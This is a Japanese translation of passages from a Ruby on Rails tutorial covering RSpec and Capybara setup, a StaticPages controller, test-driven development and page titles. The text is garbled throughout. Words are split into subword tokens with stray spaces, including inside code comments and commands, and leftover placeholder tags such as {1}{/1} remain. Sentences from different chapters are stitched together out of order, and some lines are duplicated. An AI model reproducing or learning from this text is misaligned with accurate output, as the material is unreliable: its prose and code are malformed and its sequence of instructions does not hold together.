▁ 変更 の 結果を リスト \ ref { code : pre tt y _ page _ tests } に示します 。
▁ 静的ページ の 端 正 になった テスト 。
▁ サンプルアプリケーションの 今後 の 開発 では 、 その さらに 簡潔 な スタイル を 可能な 限 り 使用する ことにします 。
▁ 本書 では 、 以後 サンプルアプリケーション を 肉 付け すること に 専 念 します 。 最初に 、 ユーザー登録 、 サインイン 、 サインアウト できる ユーザー を追加します 。 次に 、 マイクロポスト を追加します 。 最後に 、 他の ユーザーを フォロー できるようにします 。
▁続いて GitHub に プッシュ しても 構 いません 。
▁最後に Heroku へ 展開 することもできます 。
▁ RSpec の S h ar ed ▁ E x am p le を使用して テスト の 冗 長 性 を 排 除 する 。
▁" Home "
▁ 本 章では 、 今後 の チュートリアル を 楽 に 理解 できるように 、 簡単な サンプルアプリケーション を 開発 してみます 。
▁最後に 、 本書 では RSpec を使った テストを 繰り返し 実 施 していきます 。 です から 、 も し 途 中 で よく 分 から ない テストが あった として も 、 読み 飛 ば して 先に 進 む ことをお勧めします 。 1 、 2 章 先 を 読み 進め た 後に 読み 返 してみる と 、 当 初 は よく 分 から なかった テストが 、 実は と ても シ ン プ ル であることを 理解 できる はずです
▁( Co de ▁S ch o ol の \ href { http :// m b s y . co / 6 V Q 8 l } { RSpec コース } の 履 修 を 検 討 してみる の も よいでしょう 。 この コース は RSpec に関する 多くの 疑 問 に 答 え てくれる という 読者 から の 報 告 もあります )。
▁ 今回は 、 2 つの 新しい gem を使います 。 RSpec のための gem と 、 RSpec の ライブラリ のための gem です 。
▁ これはリスト \ ref { code : gemfile _ rspec } で使用されていま した 。
▁この Gemfile では 、 開発環境 と テスト 環境で \ text tt { rspec - rails } を使う ようにしています 。 このため 、 開発環境 では RSpec 固有の ジェネレータ ー にアクセス することができます 。 同様に 、 テスト 環境で も RSpec を使用して テストを 実行 できるようになります 。
▁ Gemfile に 記述 した \ text tt { rspec - rails } が 依 存 関係 を 解決 してくれ るため 、 ▁ 個 々 の 環境 に RSpec 自身 を 手動で インストール する必要が なく なり 、 自動的に インストール される ようになります 。
▁ 同様 の 理由 で 、\ href { https :// github . com / j n i c k la s / ca p y bar a } { Capybara } ▁gem も Gemfile に 記述 しています 。 これは 、 英語 に 近 い 文法 を使って 、 ユーザー と サンプルアプリケーションの 対 話 的 操作 を シ ミ ュ レ ー ション できる G e m です { p 1 } 。 Capybara は {3} S e le n i um {/3} などの gem に 依 存 しています 。
▁ Heroku は 、 開発環境 と 本番環境 と で 同じ データベース を使う ことを 推 奨 しています が 、 今回 開発 する サンプルアプリケーション では 、 データベース が 異 な って いて も 特に 問題 はありません 。 また 、 SQLite は PostgreSQL に 比 べ て \ emph { 極めて 簡単に } ▁ セットアップ できます 。
▁ このため 、 今後 は 単 に \ ko de { bundle ▁install } を実行する だけで 、 自動的に 本番環境 用 gem を スキップ できるようになります
▁ 秘 密 トークン を 動的 に 生成 する 。
▁# ▁ Y our ▁ secret ▁ key ▁is ▁use d ▁for ▁ ver if y ing ▁the ▁in te g r ity ▁of ▁ signed ▁ cookies .
▁# ▁I f ▁you ▁ change ▁this ▁ key , ▁ all ▁ ol d ▁ signed ▁ cookies ▁ will ▁be com e ▁ invalid !
▁# ▁Ma ke ▁ s ur e ▁the ▁ secret ▁is ▁ at ▁ le a st ▁ 30 ▁ cha r a c ter s ▁and ▁ all ▁ r and o m ,
▁# ▁ no ▁ re g ul ar ▁ word s ▁ or ▁you ' ll ▁be ▁ ex p o s ed ▁to ▁d i c tion ary ▁a tt ack s .
▁# ▁ Y o u ▁c an ▁use ▁` rake ▁ secret ` ▁to ▁ generate ▁a ▁ secure ▁ secret ▁ key .
▁# ▁Ma ke ▁ s ur e ▁your ▁ secret _ key _ base ▁is ▁ ke p t ▁ private
▁# ▁if ▁you ' re ▁ sh ar ing ▁your ▁ code ▁ public ly .
▁# ▁ U s e ▁the ▁ ex ist ing ▁ token .
▁# ▁ G en er at e ▁a ▁ new ▁ token ▁and ▁ store ▁it ▁in ▁ token _ file .
▁次に 、\ ko de { Test :: U n it } の代わりに RSpec を使う ように 、 Rails の設定 を変更 します 。
▁これ を行う には 、\ ko de { rails ▁ generate ▁ rspec : install } を実行します 。
▁リスト \ ref { code : gitignore } のとき
▁ 本書 では 今後 、 この サンプルアプリケーション を使って い く こと になる ので 、\ href { https :// github . com / new } { GitHub } 上 に リポジトリ を作成し 、 プッシュ しておく と 良い でしょう 。
▁もちろん 、 お 望 み であれば 、 この時点で Heroku にデプロイする こともできます 。
▁なお 、 本書 を 進め る 間 、 アプリケーションを 定 期 的に GitHub に プッシュ したり 、 Heroku にデプロイする ことをお勧めします 。
▁これにより 、 リモート 環境 に バ ッ ク アップ を 置 く ことができ 、 本番環境で 発生 する エラー を なるべく 早 期 に 発 見 することができます 。
▁ ここ まで の 準備 が完了し たら 、 いよいよ サンプルアプリケーションの 開発 を 始 め ましょう 。
▁この節では 、 後に 動的な ページ を作成する ための 準備 として 、 最初に Rails の \ emph { アクション } と \ emph { ビュー } に 静 的な HTML だけ を含め た もの を作成します
▁ 最 適 な 方法は 状 況 によって 異 なり 、 たとえば \ emph { 極めて 多 数 } の 静的なページ を 1 つの StaticPages コントローラ だけ ま か なお う と すると 重 荷 になる 可能性があります 。 今回は いくつかの 静的なページ を 作る だけ なので 、 重 荷 には なり ません 。
▁ 現在 どの ディレクトリ で 作業 している か が わ から なく な った 場合は 、\ ref { sec : the _ first _ application } ▁( {2} {1} 図 ▁1. 4 {/1} {/2} ) を 再度 参 照 して 、 Rails ▁ の ディレクトリ 構造 を 確認 してください 。
▁Rails の すべての ディレクトリ を 一覧 できる テキストエディタ または IDE が 使用できる と 非常に 便利です 。 テキストエディタ や IDE の 細 か な 使用 法 は 残念ながら それぞれ 異なります が 、 どの ツール を使って も Rails アプリケーションの ディレクトリ を開く ことができます 。 Unix 系 の システム では 、 ドット \ ko de { . } で カ レ ン ト ディレクトリ を 表現 できる ので 、 コマンドライン 上で 以下 を実行して Rails アプリケーションの 現在の ディレクトリ を 開 き 、 使用する エディタ を 呼び出し て みてください 。
▁$ ▁ cd ▁ ~ / rails _ projects / sample _ app
▁$ ▁< エディタ 名 > ▁ .
▁たとえば 、 S ublime ▁Text ▁ で サンプルアプリケーション を開く 場合は 、 以下 を実行します 。
▁$ ▁ sub l ▁ .
▁ V im の場合は 以下 を実行します 。
▁ Git ▁ で バージョン管理 を している 場合は 、 次の コマンドで トピックブランチ を作成 してください 。
▁Rails には \ ko de { generate } という スクリプト があり 、 この スクリプト に コントローラ 名 を入力する だけで 、 この 魔 法 のような スクリプト が コントローラ を作成 してくれます 。
▁これ より 、 複数の 静的なページ を 取り 扱 う StaticPages コントローラ を作成します 。
▁ 具体的には 、 Home ページ と Help ページ 、 About ページ で使用する アクション を 作 って み ます 。
▁ StaticPages コントローラ を生成する 。
▁$ ▁ rails ▁ generate ▁ controller ▁ StaticPages ▁ home ▁ help ▁-- no - test - f r am e w or k
▁ route ▁get ▁" static _ pages / help "
▁ route ▁get ▁" static _ pages / home "
▁ 一般的な シ ナ リ オ の 1 つ は 、 生成 した コードを 元に戻 したい場合 です 。 たとえば 、 コントローラ を生成し た 後 で 、 もっと い い コントローラ 名を 思い 付 いた 場合 など です 。
▁ 自動生成 された コードを 元に戻す ためには 、 新規作成 された ファイル を削除する だけ ではなく 、 既存の ファイルに 挿 入 された コード も 削除 する必要があります
▁( 実際 、\ text tt { routes . rb } ▁ ファイルに 自動的に 追加 された コード も 元に戻す 必要があります ) ▁ 。
▁ このような とき は 、\ text tt { rails ▁ destroy } コマンド を実行する だけで 元に戻す ことができます 。
▁$ ▁ rails ▁ generate ▁ controller ▁F oo B ar s ▁ baz ▁ q u u x
▁$ ▁ rails ▁ destroy ▁ controller ▁F oo B ar s ▁ baz ▁ q u u x
▁$ ▁ rails ▁ generate ▁ model ▁F oo ▁ bar : string ▁ baz : integer
▁$ ▁ rails ▁ destroy ▁ model ▁F oo
▁また 、\ emph { {1} 第 2 章 {/1} } でも 簡単に 紹 介 しました が 、 {2} マイグレーション {/2} の 変更を 元に戻す 方法 も 用意されてい ます 。 詳 細 は {3} {1} 第 6 章 {/1} {/3} で説明します 。
▁ 簡単に 言 う と 、 まず 以下の コマンドで データベースの マイグレーション を変更 できます 。
▁$ ▁rake ▁ db : migrate
▁$ ▁rake ▁ db : r o ll b ack
▁$ ▁rake ▁ db : migrate ▁ V ER S I ON = 0
▁\ ko de { config } ディレクトリ という名前の とおり 、 この ディレクトリ 内に ある ファイルは 、 Rails が アプリケーションの 設定 を 読み込む 時に 必要 になります 。
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ StaticPages コントローラ 内の \ ko de { home } アクション と \ ko de { help } アクション で使用する ルーティング 。
▁\ emph { クライアント } ▁( 通常 、 Firefox や S a fa ri などの Web ブラウザ ) ▁ と \ emph { サーバー } ▁( A p a ch e や N g in x などの Web サーバー ) ▁ は 、 上で 述 べ た 4 つの 基本 操作 を 互 い に 認 識 できる ようになっています
▁Rails を含む 多くの Web フレームワーク は 、 HTTP の 各 操作 を 発 展 させ た \ emph { REST ▁ アーキテクチャ } の 影 響 を 受け ています 。 {1}{2} 第 2 章 {/2}{/1} でも 簡単に 触 れ ましたが 、 {3} {2} 第 7 章 {/2} {/3} では 、 より 深 い 内容 について 学 び ます 。
▁\ text tt { GET } ▁ は 、 最も 頻繁に 使用される HTTP 操作 で 、 主 に Web 上の データを \ emph { 読み 取 る } 際に 使われ ます 。 “ ページを 取得 する ” ▁という 意味 の とおり 、 Web ブラウザ は g oo g le . com や w ikipedia . org のような Web サイト を開く たびに \ text tt { GET } リクエストを 送信 しています 。
▁Rails アプリケーション では 、\ text tt { POST } リクエスト は 何か を \ emph { 作成する } ときに よく 使われ ます ▁( なお 本 来 の HTTP では 、\ text tt { POST } を 更新 に 使って も よい と しています )。 たとえば 、 ユーザー登録フォーム で 新しい ユーザー を作成する とき は 、\ text tt { POST } リクエストを 送信 します 。
▁なお 、 以前の バージョンの Rails では \ text tt { PATCH } ではなく \ text tt { PUT } が 使用 され ていました 。 PUT は Rails ▁4.0 でも 依 然 サポート されて は います が 、\ text tt { PATCH } の 方が \ href { http :// web log . rubyonrails . org / 20 12 / 2 / 2 5 / ed g e - rails - patch - is - the - new - primary - http - method - for - update s /}{ 意 図 した HTTP の 使用 法 により 適 している } ので 、 新しい アプリケーション では PATCH が 推 奨 されています 。
▁これは 、 静的なページ の 集合 に対して は 、 適切な アクション と 言 え ます 。 言 い 換 え ると 、 REST アーキテクチャ は 、 あらゆる 問題 に対して 最 適 な 解決 方法 である とは 限 らない ということです 。
▁また 、 山 括 弧 \ ko de { < } は 、\ ko de { StaticPages Controller } が ▁\ ko de { Application Controller } という Rails の クラス を \ emph { 継 承 } している ことを 示 しています 。 この後 も 説明します が 、 今回 作成した ページに は 、 Rails 特 有 の 機能 が 多 数 使用 されています
▁ 今回の StaticPages コントローラ にある メソッドは 、 以下のように どちら も 最 初 は 空 になっています 。
▁ どちら の ビュー も 単なる プ レ ー ス ホ ル ダ になっています 。 ト ッ プ レベル の 見 出 し が \ ko de { h 1 } タグ の中に あり 、 関連する ファイル への 絶 対 パス が \ ko de { p } タグ の中に 書かれてい ます 。
▁ それ が 終わっ たら 、 ページ ごとに 異なる タイトル を表示する 、 ほ ん の 少し だけ 動的な コンテンツ を追加します 。
▁ 次 に進む前に 、 StaticPages コントローラ ファイルを Git リポジトリ に追加 しておきましょう 。
▁\ emph { Rails チュートリアル } ▁ では 、 一 字 一 句 間 違 え ること なく 最 初 から 正 確 に 実装 する の ではなく 、 アプリケーションの 振る舞い を テスト し ながら 実装 する 直 観 的な 手法 を 採 用 しています 。 この 開発 手法 は 、 テスト駆動開発 ▁( Test - D r ive n ▁D e ve l p m ent , ▁ T D D ) ▁ から 派 生 した 振 舞 駆 動 開発 ▁( B e ha v i or - D r ive n ▁D e ve lo p m ent , ▁B D D ) ▁ として 知 られ ています 。
▁ 結合 テスト ▁( RSpec ▁ では ▁\ emph { リクエスト spec } ▁ と 呼 んで います ) ▁ は 、 ユーザーが アプリケーション を使う 際 の 一 連 の アクション を シ ミ ュ レ ー ション します 。
▁ 結合 テストは 、 アプリケーションの 各 ページ が 正常に 動作する かどうかを テスト し てくれる 強力な ツール です 。 手動で ブラウザ を 操作 して テスト する必要が なく なり 、 Capybara を 併 用 すれば 自 然 言語 ▁( 英語 ) ▁ に 近 い 文法 で テストを 記述 する 事 も できます
▁ テスト駆動開発 の 定義 とは 、 アプリケーションを 開発 するときに \ emph { 最初に } テスト を作成し 、 次に コード を作成する ことです 。
▁この 開発 手法 に 慣 れる まで には 多 少 時間 が か か る かもしれませんが 、 一度 慣 れ て し ま えば 大きな メ リ ッ ト を 得られ ます 。
▁\ emph { 失敗する } テストを 最初に 書き 、 テストにパス する コードを 次に 実装 することで 、 しか る べ き 振る舞い が テスト によって 正しく 検証 されている 、 という 自 信 が 付き ます 。
▁さらに 、 この 「 失敗 - 実装 - 成功 」 という 開発 サ イ ク ル は 、 「\ href { http :// en . w ikipedia . org / wiki / F lo w _ ( p s y ch o log y ) } { フ ロー 体 験 }」 を 誘 発 します 。 フ ロー に 入 ること で 、 コ ー デ ィ ング が 楽 しく なり 、 開発 の 生 産 性 も 向 上 します 。
▁また 、 テストは アプリケーションの コード に対して \ emph { クライアント } として 振 る 舞 う ので 、 ソフトウェア 設計 の 改良 に つ な が ること も 多 くなる でしょう 。
▁ただし 、 テスト駆動開発 が どんな 仕 事 に対して も 常に 正しい 手法 である とは 限 り ません 。 この ことは 十分 に 理解 して おいてください 。 「 最初に テストを書く べ き である 」 、「 テストは ひとつ ひとつ の 機能を 完全に カ バー する べ き である 」 、「 すべての 箇所 を テスト すべき である 」 など のような 教 条 的な 主 張 を 正 当 化 できる 理由 は ど こ にも ありません 。
▁たとえば 、 与えられた 課題 の 解決 法 に 今 ひとつ 確 信 が 持 て ない とき は 、 ( テストを 書 か ずに ) ▁ まず 試 し に アプリケーション コード だけ を 書い て み て 、 どんな 解決 方法 がある のか 模 索 してみる 方が 良い 結果を 得られ る こともあります
▁(\ href { http :// en . w ikipedia . org / wiki / E x tr e me _ Pro gra m m ing } { エ ク スト リ ー ム ・ プログラミング ▁( E x tr e me ▁ Pro gra m m ing ) } ▁という 開発 手法 では 、 この 模 索 段 階 を \ emph { ス パ イ ク ▁( s p i ke ) ▁ } と 呼 んで います )。
▁ そして 解決 策 が 明 確 になった 段 階 で 、 テスト駆動開発 で コードを 清 書 する という 方法 も あり え ます 。
▁この節では 、 RSpec ▁gem によって 提供され る \ ko de { rspec } コマンド を使って テスト を実行します 。
▁ テスト駆動開発 で 最初に 書く 、\ emph { 失敗する } テスト の ことを 、 一般的な テスト ツール では 「 赤 色 ▁( Re d )」 と 表現 します ▁( 失敗 時に 表示 が 赤 くなる ツール が多い ため )。
▁ 同様に 、 次に 書く 、 テストにパス する コードの ことを 「 緑色 ▁( G re en )」 と 表現 します 。
▁最後に 、 必要に応じて コードを リファクタリング ▁( 例 えば 、 動作 を 変え ずに コードを 改 善 したり 、 冗 長 な コードを 削除 したり すること ) ▁ します 。
▁この サ イ ク ル の ことを 「 Re d / G re en / Re factor 」 と呼びます 。
▁それでは 、 テスト駆動開発 で いくつかの コンテンツ を Home ページ に追加 してみましょう 。 ト ッ プ レベル の 見 出 し ▁(\ ko de { < h 1> }) ▁ に ▁" \ ko de { Sample ▁A p p } " ▁という 語 を追加する 作業 も この 中に 含 まれ ます 。 ▁ まず 、 静的なページ に対する 結合 テスト ▁( request ▁ spec ) ▁ を生成する ところ から 始 め ましょう 。
▁invo ke ▁ rspec
▁create ▁ spec / request s / static _ pages _ spec . rb
▁これにより 、\ ko de { spec / request s } ディレクトリ に \ ko de { static _ pages _ spec . rb } が 生成されます 。
▁ 置き換え る 文字列 は 以下 を使用します 。
▁ Home ページ の内容 をテストする コード 。
▁これは 、 Ruby の 柔 軟 性 の 高 さ を 応 用 して 、 RSpec が テスト 用の 独 自 言語 ▁(\ emph { D o main - S p ec if i c ▁ L an g u age : ▁D S L }) ▁ を定義し ている からです 。
▁ここで 重要な のは 、\ emph { RSpec を使う ために RSpec 独自の 文法 を理解する 必要 は ない } ということです 。 最初の う ち は 魔 法 のように 見え る かもしれませんが 、 RSpec や Capybara は 英語 に 近 い 形 で 読 め るように 設計 されています 。 したがって 、 本チュートリアルで 取り上げ る テスト 例 を 読み 進め る だけで 、 英語 圏 の 方 なら RSpec の 文法 を 楽 に 扱 え る ようになります 。
▁ 最初の 行 では 、 Home ページ に対するテスト であることを 記述 しています 。
▁これは 単なる 文字列 であり 、 好 き な 文字列 を使用できます 。 RSpec はこの 文字列を 解 釈 し ないので 、 人 間 にとって わかり やすい 説明 を ここに 書く ようにします 。
▁ 次の 行 では 、 「\ ko de { / static _ pages / home } の Home ページ にアクセス した とき 、 “ Sample ▁A p p ” という 語 が含まれ て い なければならない 」 と 記述 しています 。
▁ 最初の 行 と同様 で 、 RSpec ▁ は ダ ブ ル ク ォ ート ▁( ") ▁ で 囲 まれ た 文字列を 無視 します ので 、 ここに も 人 間 にとって わかり やすい 説明 文 を 書き ましょう ▁( 訳 注 : ▁ 英語 で ▁ sh o ul d ▁ ha ve ... と 書くこと で 、 メソッドの it と 整 合 性 が 取 れ ます )。
▁その 次の 行 について説明し ます 。
▁上の 行 は 、 Capybara の \ ko de { v is it } 機能 を使って 、 ブラウザで の \ ko de { / static _ pages / home } URL への アクセス を シ ミ ュ レ ー ション します 。
▁その 次の 行 ▁( 上のコード ) ▁ では 、 これ も Capybara が提供する \ ko de { page } 変数 を使って 、 アクセス した 結果 の ページに 正しい コンテンツ が表示されている かどうかを テスト しています 。
▁self を省略した 結果を リスト \ ref { code : ca p y bar a _ d s l } に示します 。
▁(\ emph { Rails チュートリアル } の 第 3 版 を 出 す ときに は 、 新しい \ href { https :// www . re li sh app . com / rspec / rspec - rails / doc s / f e at ur e - spec s / f e at ur e - spec } { f e at ur e ▁ spec s } の 技 法 を使用して この 行 の 追加 を 不 要 にする ことを 計 画 しています )。
▁ Capybara ▁D S L を RSpec ヘルパー ファイル に追加する 。
▁# ▁This ▁ file ▁is ▁ co p i ed ▁to ▁ spec / ▁ w h en ▁you ▁run ▁' rails ▁ generate ▁ rspec : install '
▁ 今回は 、 コマンドライン で \ ko de { rspec } コマンド を実行して み て ましょう ▁( なお 、\ ko de { bundle ▁exec } を この コマンド の 前 に置く ことで 、\ ko de { Gemfile } 内で 定義された 環境で RSpec が 実行される ように 、 明示的に 指示 することができます { p 1 })。
▁ 筆者 は 普 段 、 ターミナル や テキストエディタ の 背 景 は 黒 色 に しています が 、 明 る い 色 の 背 景 の 方が ス ク リ ー ン シ ョ ッ ト の 見 栄 え が 良い ので 、 ( 一時 的に ) ▁ 明 る い 背 景 を使用しています 。
▁ これはリスト \ ref { code : home _ page _ passing } で使用されていま した 。
▁ テストにパス する Home ページ 用 コード 。
▁ ト ッ プ レベル の 見 出 し ▁(\ ko de { < h 1> }) ▁ が \ ko de { Sample ▁A p p } に変更 された ため 、 上のコード は テストにパス します 。
▁また 、\ emph { ア ン カ ー } タグ ▁\ ko de { a } ▁ を使って 、 指定 した URL に ジ ャ ン プ する 以下の リンク を追加し ました ▁( ちなみに ア ン カ ー タグ 内の ▁“ href ” ▁ は ▁“ h y per text ▁ ref er en ce ” ▁ と 読み ます )。
▁ 結果を 見 るために 、 もう一度 テストを 実行 してみましょう 。
▁ Help ページ についても 、 Home ページ の例 を 参 考 に して 、 同じ ような テスト と アプリケーション コードを 使用できる ことが 推測 できます 。
▁ Help ページ の内容 をテストする コード を追加する 。
▁上のコード で テストを 実行 してみます 。
▁ テスト のうち 、 1 つ は 失敗 するはずです 。
▁( 注 : ▁ 執 筆 作業 軽 減 の ため 、 今後 は RSpec の 出力結果 を 掲 載 しません 。 画面 表示 の内容 は システム によって 大きく 異なる う え 、 各 段 階 で の 出力 画面 数 を 把 握 して メ ン テ ナ ン ス し 続 け る の が 極めて 困 難 な ためです 。 ご 了 承 ください 。 )
▁置き換えた結果を {0}{1} リスト 4 .3{/1}{/0} に示します 。
▁ テストにパス する 、 Help ページ 用の コード 。
▁これで テストにパス するはずです 。
▁ 段 階 ごとに テスト を作成して RSpec を実行する ことで 、 テスト駆動開発 によって アプリケーション 開発 を 進め る 方法 を 理解 できるように な る でしょう 。
▁ 赤 色 から 緑色 に するために 、 最初に About ページ 用の 失敗する テストを 書き 、 赤 色 に しましょう 。
▁ About ページ のテスト を追加する 。
▁ 今回の 場合 、 ▁ About ページ を使用 できるように するには 、\ ko de { about } アクション を StaticPages コントローラ の中に 追加する必要があります 。
▁最初に 失敗する テストを 書き 、 次に その テストにパス する ように 実装 することで 、 正常に 動作する About ページ を作成 できた という 実 感 を得る ことができます 。
▁ 先ほど 実装 した RSpec のテスト を実行します 。
▁ 上 を実行し た 出力結果 の中に 、 以下のような 警 告 が含まれ ている はずです 。
▁ No ▁ route ▁ match es ▁[ GET ] ▁" / static _ pages / about "
▁self を省略した 結果を リスト \ ref { code : about _ route } に示します 。
▁ 再 び 以下 を実行します 。
▁今度は 以下の エラーメッセージ が発生し ます 。
▁\ ko de { about } アクション が追加され た StaticPages コントローラ 。
▁今度は 、 ビュー などの ▁" テンプレート " ▁ が 見 当 たら ない という エラーメッセージ が表示されます 。
▁これは 、\ ko de { about } ビュー を追加する ことで 解決 します 。
▁ これはリスト \ ref { code : about _ view } で使用されていま した 。
▁is ▁a ▁ pro j e ct ▁to ▁ ma ke ▁a ▁ book ▁and ▁ sc re en casts ▁to ▁t each ▁ web ▁ development
▁is ▁the ▁ sample ▁ application ▁for ▁the ▁ tutorial .
▁今度は 、 RSpec を実行すると 緑色 になるはずです 。
▁ テストが 緑色 になった ので 、 安 心 して コードを リファクタリング できるようになりました 。
▁ 多くの 場合 、 コードを 書き 進め る う ち に 肥 大 化 したり 繰り返し が 増え たり して 、 い つ しか 「 悪 臭 を 放 つ 」 醜 悪 な コード になり は て る ものです 。
▁ コンピュータ は コードが 醜 く ても 気 に しません が 、 開発者 にとって は そう は い き ません 。 だ から こ そ 、 頻繁に リファクタリング を 実 施 し 、 コードを 清 潔 な 状態 に 保 ち 続 け ること が 重要です 。
▁この 点 において 、 良い テストコード がある ということ は 非常に 貴 重 です 。 リファクタリング する 際に バグ が 混 入 する 可能性 を 劇 的に 小 さ く し てくれる からです 。
▁以上で 、 静的ページ の アクション と ビュー を作成し ました 。 次 は 、 ページ の内容 を 反 映 した タイトル を 持 ち 、 ページ ごとに 内容 が 変 化 する 、\ emph { 少し だけ } 動的な ページ を作成 してみましょう 。
▁ title タグ は 、 ほとんど の ブラウザで ウ ィ ンド ウ の 上 に 表示 されます ▁( Google ▁C h r o me は 例外 ですが )。 title タグ は 、 検索 エンジン 最適化 ▁( S E O ) ▁ において も 重要な 役 割 を 担 っています 。
▁最初に タイトル のテスト を作成し 、 次に タイトル を追加し 、 最後に \ emph { レイアウト } ファイル を使って リファクタリング と 重複 の 排 除 を行います 。
▁ レイアウト ファイルは 、\ ko de { rails ▁ new } コマンド を実行し ていれば 既に 作成 されている はずです 。
▁ レイアウト ファイルの 役 割 については この後 説明します が 、 まず は 作業 開 始 前に レイアウト ファイルの ファイル名 を変更 しておきましょう 。
▁(\ ko de { m v } は Unix の コマンド です 。 Windows で ファイル名 を変更する には 、 ファイル ブラウザから 行う か 、\ ko de { re name } コマンド を使って ください )。
▁ これはリスト \ ref { code : title _ test } で使用されていま した 。
▁ タイトル のテスト 。
▁この テストでは \ ko de { ha ve _ title } メソッド を使っています 。 これは 与えられた コンテンツ に HTML 要素 ▁( タイトル ) ▁ がある かどうかをチェックし ます 。
▁つまり 、 以下のコード は 、
▁\ ko de { title } タグ の内容 が 以下の とおり になっている ことを確認します 。
▁ここで 注意 して い ただ き たい のは 、 与えられた 内容 に対して 完 全 一致する 文字列 を使用し なく て は な らない ということ ではなく 、 以下のように 部分 文字列 を指定する だけで も よい ということです 。
▁上のコード でも タイトル 全体 と マッチ します 。
▁ タイトル のテスト を含む StaticPages コントローラの spec ファイル 。
▁今度は テストが 赤 色 ▁( テストが 失敗する ) ▁ になるはずです 。
▁今度は 、 タイトル の テストが パス する ように し 、 それ と 同時に Web ページを 正しく 表示 させる ための HTML をすべて 追加 しましょう 。
▁ 現 代 的な Web ページの マークアップ は 、 基本的に 以下の ようになっています 。
▁ 極めて シンプルな doc type 宣言 である \ ko de { < ! D O C T Y P E ▁ html > } は 、 最新の 標準 HTML ▁( HTML 5 ) ▁ であることを 示 しています 。
▁従って 、 Home ページの テストは パス するはずです 。
▁ 緑 ▁( G re en )
▁このコードは リスト \ ref { code : help _ view _ full _ html } で使用されていま した 。 もうひとつ 、
▁is ▁a ▁ pro j e ct ▁to ▁ ma ke ▁a ▁ book ▁and ▁ sc re en casts ▁to ▁t each ▁ web ▁ development
▁is ▁the ▁ sample ▁ application ▁for ▁the ▁ tutorial .
▁ このような コードの 重複 は 、「 重複 して は な らない 」( D on ’ t ▁ Re p e at ▁ Y our self , ▁D R Y ) ▁という 重要な 原 則 に 反 しています 。 以後 、 この節 と 次の 節 では 重複 を 取り 除 き 、 コードを D R Y に していきます 。
▁ 重複 を 取り 除 く テクニック の 一 つ として 、 ビューで \ emph { 埋め込み Ruby } ▁( E m b ed de d ▁Ruby ) ▁ を使用できます 。
▁ タイトル に Ruby を 埋 め 込 んだ Home ページの ビュー
▁ タイトル で 埋め込み Ruby を使用した Help ページの ビュー
▁ タイトル で 埋め込み Ruby を使用した About ページの ビュー
▁これ を見ると 、 唯 一 の 例外 である \ emph { body } タグ の内容 を 除 き 、\ ko de { すべて } の ページ で ▁( title タグ の内容 を含め ) ▁ 同じ 構造 になっている ことがわかります 。
▁この レイアウト ファイル を有効に するには 、 デフォルトの タイトル 部分を 以下の 埋め込み Ruby のコード に 差 し 替 え ます 。
▁この 章では 、 Rails の 強力な 機能を いくつか 紹 介 するための デ モ アプリケーション を作成します 。
▁\ emph { scaffold } ジェネレータ という スクリプト を使って アプリケーションを す ば や く 生成 する 事 により 、 ▁ 高度な Rails プログラミング と Web プログラミング の概要 を 学 び ます 。
▁最後に 、 この リファクタリング が 正常に 行われた ことを確認 するために 、 リファクタリング 前 と同様に テストにパス する ことを確認します 。
▁ 生成された Rails アプリケーション は ブラウザ の アドレス バー に URL を 入力 すれば 動か す ことができる ので 、 これにより Rails アプリ の 構造 、 そして Rails で 推 奨 されている \ emph { REST アーキテクチャ } に関する 洞 察 を得る ことにします 。
▁ 後に 作成する サンプルアプリケーション と同様 、 デ モ アプリケーション は 、\ emph { ユーザー } と 、 それ に 関連 している \ emph { マイクロポスト } から 成 り 立 っています 。
▁ 次の 章 に進む前に 、 差 分 を コミット して マ ス ター ブランチ に マージ しておきましょう 。
▁ は じ め に 、 デ モ アプリケーションを ど のような もの にする のか 、 計 画 を 立 て ましょう 。
▁ デ モ アプリケーション 用の \ ko de { Gemfile } 。
▁ 好 み に応じて 、 更新 した アプリケーションを Heroku に 展開 しても 構 いません 。
▁( 第 1 章 でも 書き ましたが 、 Bundler で \ text tt { read line } エラーが発生し た場合 は 、\ ko de { Gemfile } に \ ko de { gem ▁ ’ rb - read line ’ } を追加し てください )。
▁最後に 、 この デ モ アプリケーションを バージョン管理 下 に置き ます 。
▁リスト \ ref { code : gitignore } のとき
▁ Git リポジトリ を 初期化 して 最初の コミット を 実行 しておきます 。
▁{0} 図 2.1 {/0} {1} GitHub で デ モ アプリ 用 リポジトリ を作成する 。 \ href { http :// railstutorial . org / images / figure s / create _ demo _ re p o _4_0 - full . png }{( 拡大 ) }{/1}
▁ 基本 となる タイトル を含む StaticPages コントローラの spec 。
▁( 最初の アプリケーションの とき と同様 、 GitHub リポジトリ を 初期化 するときに \ emph { README } を使用 \ ko de { しない } ように 注意 してください 。 )
▁ 今回の デ モ アプリケーション では 、 ユーザー と 短 い マイクロポスト のみ を サポート する マ イ ク ロ ブログ を作成します 。
▁ 各 ユーザー には 、 重複 の ない 一意 の キー となる \ ko de { integer } 型 の ID 番号 ▁(\ ko de { id } と呼びます ) ▁ を 割り当て 、 この ID に 加 え て 一 般 公開 される \ ko de { string } 型 の名前 ▁(\ ko de { name }) 、 そして 同じ く \ ko de { string } 型 の メールアドレス ▁(\ ko de { email }) ▁ を 持 た せ ます 。 メールアドレス は ユーザー名 として も 使われ ます 。
▁ SQLite の代わりに PostgreSQL を使う 場合 の \ ko de { Gemfile } 。
▁ マイクロポストの データモデル は ユーザー 用の データモデル よりも さらに シ ン プ ル です 。 \ ko de { id } と 、 マイクロポストの テキスト 内容 を 格 納 する \ ko de { string } 型 の \ ko de { content } だけで 構成 されています
▁最後に 、 S ublime ▁Text 上で 直接 テスト を実行する 方法 を 紹 介 します 。 この テクニック は 、 特に Spork と 併 用 すると 非常に 便利です 。
▁ もっと 多 い 文字 数 の 投 稿 できる モデルに したい場合は ▁( たとえば 、 マイクロポスト ではなく 、 ブログ のような 投 稿 を 許可 したい場合は ) 、\ ko de { string } の代わりに \ ko de { text } を使うと よいでしょう 。
▁ この節 は 、 ほとんど が 上 級 者 向け の内容 になっ ており 、 この節 を 飛 ば しても 次の 章 以降 には 何 の 影 響 も ありません 。
▁しかし 実際には 、 マイクロポストを ユーザー と \ emph { 関連付け る ▁( associate ) } ▁ 必要がある ため 、 ポ スト の オ ー ナ ー を 記 録 するための \ ko de { user _ id } も 追加 します 。
